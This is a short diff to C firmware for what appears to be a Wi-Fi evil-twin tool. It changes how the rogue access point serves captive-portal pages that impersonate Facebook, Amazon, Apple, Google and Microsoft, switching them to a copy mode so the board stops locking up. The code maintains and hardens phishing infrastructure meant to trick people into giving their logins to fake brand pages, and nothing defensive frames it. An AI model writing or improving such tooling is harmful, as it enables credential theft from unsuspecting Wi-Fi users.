@@ -2238,11 +2238,15 @@ static void resolve_eviltwin_portal(const char** body, int* len, bool* gzip, boo
   const char* b; int l; bool cp = false;
   switch ((enum portals)portal) {
 #ifdef PETREL_BRAND_PORTALS   // real-brand pages: private overlay only; else these fall to Default
-    case Facebook:  b = (const char*)facebook;  l = facebook_len;  break;
-    case Amazon:    b = (const char*)amazon;    l = amazon_len;    break;
-    case Apple:     b = (const char*)apple;     l = apple_len;     break;
-    case Google:    b = (const char*)google;    l = google_len;    break;
-    case Microsoft: b = (const char*)microsoft; l = microsoft_len; break;
+    // 2026-10-28: these were streamed zero-copy straight out of flash. Serving the 39 KB Facebook
+    // blob that way hard-locked the board (loop() stopped, AP died, phone lost the netif) while the
+    // 3.4 KB plain Default page was stable. Queued with COPY instead; the blob is small enough that
+    // the extra pbuf copy is cheap next to a dead AP.
+    case Facebook:  b = (const char*)facebook;  l = facebook_len;  cp = true; break;
+    case Amazon:    b = (const char*)amazon;    l = amazon_len;    cp = true; break;
+    case Apple:     b = (const char*)apple;     l = apple_len;     cp = true; break;
+    case Google:    b = (const char*)google;    l = google_len;    cp = true; break;
+    case Microsoft: b = (const char*)microsoft; l = microsoft_len; cp = true; break;
 #endif
     case Custom:    b = customPortal; l = customPortalLen; cp = true; break;   // mutable -> COPY
     case Default:
